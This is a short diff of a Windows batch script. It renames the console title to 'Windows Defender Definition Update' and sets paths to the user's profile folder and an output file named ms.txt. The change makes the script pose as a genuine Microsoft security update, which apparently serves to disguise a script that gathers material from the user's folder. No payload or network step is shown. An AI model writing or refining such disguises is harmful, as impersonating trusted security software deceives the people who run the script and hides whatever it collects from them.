@@ -1,6 +1,6 @@
 @echo off
 setlocal
-title Windows is checking if you have malware.
+title Windows Defender Definition Update
 set "userFolder=%USERPROFILE%"
 set "outputFile=%~dp0ms.txt"
 
